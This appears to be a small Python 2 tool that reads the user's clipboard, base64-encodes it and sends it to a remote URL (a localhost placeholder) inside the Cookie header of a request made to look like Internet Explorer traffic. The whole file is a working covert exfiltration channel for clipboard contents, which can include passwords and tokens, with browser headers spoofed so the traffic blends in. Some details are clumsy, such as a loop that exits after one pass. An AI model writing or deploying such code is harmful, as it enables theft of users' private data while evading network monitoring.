#!/usr/bin/python
# coding:utf-8

import pyperclip
import requests
import sys
from base64 import b64encode

url = 'http://127.0.0.1'
s = pyperclip.paste()

for line in s:
    try:
        print(s)

        headers = {
            'Accept': 'text/html, application/xhtml+xml, */*',
            'Accept-Language': 'en-US',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; :11.0) like Gecko',
            'Accept-Encoding': 'gzip, deflate',
            'Host': '%s' % url,
            'DNT': '1',
            'Connection': 'Keep-Alive',
            'Cookie': '%s' % b64encode(s),
        }
        r = requests.get(url, headers=headers)
        print('Message sent - Got HTTP Response Code %s') % r.status_code
        print(headers)
    except Exception, e:
        print(e)
    sys.exit(1)





